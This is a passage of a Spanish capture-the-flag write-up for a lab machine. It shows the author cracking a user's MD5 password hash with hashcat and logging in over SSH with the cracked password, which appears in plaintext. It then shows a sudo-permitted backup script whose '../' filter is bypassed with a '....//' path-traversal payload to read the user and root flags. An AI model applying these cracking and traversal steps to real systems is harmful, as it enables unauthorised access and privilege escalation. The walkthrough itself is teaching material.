+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8600</span> <span style="color:#f92672">|</span> Lotus Notes<span style="color:#f92672">/</span>Domino <span style="color:#ae81ff">5</span>                                       <span style="color:#f92672">|</span> Enterprise Application <span style="color:#a6e22e">Software </span>(EAS)
+</span></span></code></pre></div><p>Con el texto que nos proporciona [[Hashcat]] podemos saber los posibles tipo de [[Hash]] se han utilizado para <strong>hashear</strong> la <em>contraseña</em> de <strong>Martin</strong></p>
+<h3 id="uso-de-hash-md5">Uso de [[Hash MD5]]</h3>
+<p>Usaremso el [[Hashcat]] para Deshashear la contraseña Hasheada con valor [[Hash MD5]], ya que es de las mas famosas y si esta no nos deja probaremos con [[Hash MD4]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#34;3de6f30c4a09c27fc71932bfc68474be&#34;</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt <span style="color:#f92672">--</span>force
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Saldra la contraseña pero para verlo la contraseña que nos proporciono podemos usar lo siguinete:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#34;3de6f30c4a09c27fc71932bfc68474be&#34;</span> <span style="color:#f92672">--</span>show
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>de6f30c4a09c27fc71932bfc68474be<span style="color:#f92672">:</span>nafeelswordsmaster
+</span></span></code></pre></div><p>Como podemos ver [[Hashcat]] no dio la <em>contraseña</em> que tenia el usuario <strong>Martin</strong> lo que procedemos a copiarla y ponerla en un <strong>.txt</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ cat Credenciales.txt
+</span></span><span style="display:flex;"><span>	File<span style="color:#f92672">:</span> Credenciales.txt
+</span></span><span style="display:flex;"><span>Martin<span style="color:#f92672">:</span><span style="color:#ae81ff">3</span>de6f30c4a09c27fc71932bfc68474be<span style="color:#f92672">:</span>nafeelswordsmaster
+</span></span></code></pre></div><p>Ya con esto podemos usar las <strong>credenciales</strong> guardadas para entrar en [[SSH]] con el siguiente comando :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ ssh martin<span style="color:#f92672">@</span><span style="color:#ae81ff">10.10.11.62</span>
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span><span style="color:#ae81ff">10.10.11.62</span><span style="color:#e6db74">&#39;s password: &#39;</span>nafeelswordsmaster<span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p>Una vez dentro del sistema deberemos poner los valores para que la [[Terminal]] tenga las mismas configuraciones que nuestra [[Terminal]]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> stty rows <span style="color:#ae81ff">84</span> columns <span style="color:#ae81ff">154</span>
+</span></span></code></pre></div><p>Con estos valores podremos hacer CTRL + L y se limpiara la [[terminal]] y diversas funciones mas, aparte de configuración de la escala de la [[Terminal]]</p>
+<hr>
+<h2 id="investigación-dentro-del-sistema-victima">Investigación dentro del Sistema Victima</h2>
+<p>Podemos confirmar la version de Ubuntu que es la maquina</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>backups<span style="color:#f92672">$</span> lsb_release <span style="color:#f92672">-</span>a
+</span></span><span style="display:flex;"><span>No LSB modules are available.
+</span></span><span style="display:flex;"><span>Distributor ID<span style="color:#f92672">:</span>	Ubuntu
+</span></span><span style="display:flex;"><span>Description<span style="color:#f92672">:</span>	Ubuntu <span style="color:#ae81ff">20.04.6</span> LTS
+</span></span><span style="display:flex;"><span>Release<span style="color:#f92672">:</span>	<span style="color:#ae81ff">20.04</span>
+</span></span><span style="display:flex;"><span>Codename<span style="color:#f92672">:</span>	focal
+</span></span></code></pre></div><p>Ahora que estamos dentro del <strong>sistema</strong> del la <strong>maquina victim</strong>a podemos ver con el siguiente <em>comando</em> si tienen <strong>permisos</strong> en algún <em>archivo</em> y <strong>examinar</strong> este para ver si podemos hacer algo para coger la la <strong>flag</strong> del <em>usuario</em> y si es posible al del <strong>root</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>backups<span style="color:#f92672">$</span> sudo <span style="color:#f92672">-</span>l 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> martin on localhost<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>sbin\<span style="color:#f92672">:/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>bin\<span style="color:#f92672">:/</span>usr<span style="color:#f92672">/</span>sbin\<span style="color:#f92672">:/</span>usr<span style="color:#f92672">/</span>bin\<span style="color:#f92672">:/</span>sbin\<span style="color:#f92672">:/</span>bin\<span style="color:#f92672">:/</span>snap<span style="color:#f92672">/</span>bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User martin may run the following commands on localhost<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    (ALL <span style="color:#f92672">:</span> ALL) NOPASSWD<span style="color:#f92672">:</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>backy.sh
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>backups<span style="color:#f92672">$</span> 
+</span></span></code></pre></div><hr>
+<h2 id="acceder-al-usertxt">Acceder al User.txt</h2>
+<p>Como pudimos ver el <em>usuario</em> <strong>Martin</strong> tiene privilegios de <strong>Sudoers</strong> en un <em>archivo</em> alojado en <em>/usr/bin/backy.sh</em> que al <em>examinarlo</em> podemos ver lagunas cosas interesantes en el:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">$</span> ls <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#39;backy.sh&#39;</span>
+</span></span><span style="display:flex;"><span>backy.sh
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">$</span> cat backy.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> [[ <span style="color:#f92672">$</span><span style="color:#75715e"># -ne 1 ]]; then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>echo <span style="color:#e6db74">&#34;Usage: $0 &lt;task.json&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>json_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> [[ <span style="color:#f92672">!</span> <span style="color:#f92672">-</span>f <span style="color:#e6db74">&#34;$json_file&#34;</span> ]]; then
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>echo <span style="color:#e6db74">&#34;Error: File &#39;$json_file&#39; not found.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>allowed_paths<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;/var/&#34;</span> <span style="color:#e6db74">&#34;/home/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>updated_json<span style="color:#f92672">=$</span>(<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>jq <span style="color:#e6db74">&#39;.directories_to_archive |= map(gsub(&#34;\\.\\./&#34;; &#34;&#34;))&#39;</span> <span style="color:#e6db74">&#34;$json_file&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>echo <span style="color:#e6db74">&#34;$updated_json&#34;</span> <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;$json_file&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>directories_to_archive<span style="color:#f92672">=$</span>(<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>echo <span style="color:#e6db74">&#34;$updated_json&#34;</span> <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>jq <span style="color:#f92672">-</span>r <span style="color:#e6db74">&#39;.directories_to_archive[]&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">is_allowed_path</span>() {
+</span></span><span style="display:flex;"><span>    local path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$1&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> allowed_path <span style="color:#66d9ef">in</span> <span style="color:#e6db74">&#34;${allowed_paths[@]}&#34;</span>; do
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> [[ <span style="color:#e6db74">&#34;$path&#34;</span> <span style="color:#f92672">==</span> <span style="color:#f92672">$</span>allowed_path<span style="color:#f92672">*</span> ]]; then
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        fi
+</span></span><span style="display:flex;"><span>    done
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dir <span style="color:#66d9ef">in</span> <span style="color:#f92672">$</span>directories_to_archive; do
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">!</span> is_allowed_path <span style="color:#e6db74">&#34;$dir&#34;</span>; then
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>echo <span style="color:#e6db74">&#34;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.&#34;</span>
+</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    fi
+</span></span><span style="display:flex;"><span>done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>backy <span style="color:#e6db74">&#34;$json_file&#34;</span>
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">$</span> 
+</span></span></code></pre></div><p>Lo que podemos ver es que esto lo que hace es hacer un archivo <strong>Task.json</strong> que lo que realiza en un BackUp.</p>
+<p>Si miramos el <strong>Task.json</strong> veremos que hace en cuestión.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>backups<span style="color:#f92672">$</span> cat task.json
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;destination&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/home/martin/backups/&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;multiprocessing&#34;</span><span style="color:#f92672">:</span> true,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;verbose_log&#34;</span><span style="color:#f92672">:</span> false,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;directories_to_archive&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;/home/app-production/app&#34;</span>
+</span></span><span style="display:flex;"><span>	],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;exclude&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;.*&#34;</span>
+</span></span><span style="display:flex;"><span>	]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Lo que podemos hacer ahora es ejecutar el <strong>backy.sh</strong> pero antes deberíamos cambiar el archivo <strong>task.json</strong> que es el que nos dice donde se <em>almacenara</em> la <strong>backup</strong> y que queremos que se haga dicho <strong>backup</strong> y no genere</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;destination&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/home/martin/&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;multiprocessing&#34;</span><span style="color:#f92672">:</span> true,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;verbose_log&#34;</span><span style="color:#f92672">:</span> false,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;directories_to_archive&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;/home/app-production/user.txt&#34;</span>
+</span></span><span style="display:flex;"><span>	],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;exclude&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;.*&#34;</span>
+</span></span><span style="display:flex;"><span>	]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Y procedemos a ver lo que nos genero :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> ls
+</span></span><span style="display:flex;"><span>backups  code_home_app<span style="color:#f92672">-</span>production_user.txt_2025_April.tar.bz2
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> tar <span style="color:#f92672">-</span>xjf code_home_app<span style="color:#f92672">-</span>production_user.txt_2025_April.tar.bz2
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> ls
+</span></span><span style="display:flex;"><span>backups  code_home_app<span style="color:#f92672">-</span>production_user.txt_2025_April.tar.bz2  home
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> cd home<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>home<span style="color:#f92672">$</span> ls
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">-</span>production
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>home<span style="color:#f92672">$</span> cd app<span style="color:#f92672">-</span>production<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>home<span style="color:#f92672">/</span>app<span style="color:#f92672">-</span>production<span style="color:#f92672">$</span> ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>home<span style="color:#f92672">/</span>app<span style="color:#f92672">-</span>production<span style="color:#f92672">$</span> cat user.txt 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Se ve la Flag del usuario.</span>
+</span></span></code></pre></div><hr>
+<h2 id="acceder-al-root">Acceder al Root</h2>
+<p>Ahora que conseguimos la <strong>Flag</strong> de el usuario lo que procedemos hacer es intentar conseguir la <strong>flag</strong> del <em>usuario</em> <strong>Root</strong>, con ello lo que podemos hacer es modificar de nuevo el <strong>Task.json</strong> de una manera que pase por los <em>directorios</em> y llegue al <strong>root.txt</strong></p>
+<p>En el <strong>backy.sh</strong> pudimos ver antes que lo mas profundo que se podría ir era al <em>/var</em> o <em>/home</em> lo que vamos hacer es probar por el <em>directorio</em> <em>/var</em>, ya que este se aloja de <strong>default</strong> en la directiva del <strong>root</strong> y retrocediendo podemos llegar a un punto para coger la <strong>flag</strong> de <strong>root</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;destination&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/home/martin/&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;multiprocessing&#34;</span><span style="color:#f92672">:</span> true,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;verbose_log&#34;</span><span style="color:#f92672">:</span> true,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;directories_to_archive&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;/var/....//root&#34;</span>
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;exclude&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;.*&#34;</span>
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Y procedemos a ver lo que nos genero :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> ls
+</span></span><span style="display:flex;"><span>backups  code_var_…_root_root.txt_2025_April.tar.bz2
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> tar <span style="color:#f92672">-</span>xjf code_var_…_root_root.txt_2025_April.tar.bz2
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~$</span> ls
+</span></span><span style="display:flex;"><span>backups  code_var_…_root_root.txt_2025_April.tar.bz2  root
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>home<span style="color:#f92672">$</span> cd root<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>home<span style="color:#f92672">/</span>app<span style="color:#f92672">-</span>production<span style="color:#f92672">$</span> ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>martin<span style="color:#f92672">@</span>code<span style="color:#f92672">:~/</span>home<span style="color:#f92672">/</span>app<span style="color:#f92672">-</span>production<span style="color:#f92672">$</span> cat root.txt 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Se ve la Flag del root.</span>
+</span></span></code></pre></div>
+        </article>
+
+        <footer style="margin-top: 40px; text-align: center; color: #444; font-size: 0.8em;">
+            <p>_ Terminando sesión... exit</p>
+        </footer>
+    </div>
+</body>
+</html>
